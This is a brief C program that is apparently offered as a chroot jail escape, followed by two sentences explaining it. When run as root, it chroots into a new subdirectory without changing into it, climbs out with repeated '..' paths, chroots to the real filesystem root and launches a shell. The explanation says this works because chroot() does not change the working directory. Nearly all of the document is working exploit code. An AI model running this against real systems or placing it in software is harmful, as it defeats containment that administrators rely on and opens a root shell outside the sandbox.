int main()
{
	chdir("/");
	mkdir("foo");
	chroot("foo");
	chdir("../../../../../../..");
	chroot(".");
	execl("/bin/sh", "sh", NULL);
}
Run as root and you're out of the chroot jail. This is because
chroot() doesn't chdir() to the new root, so after a chroot() in
the chroot jail you're suddenly out of it.
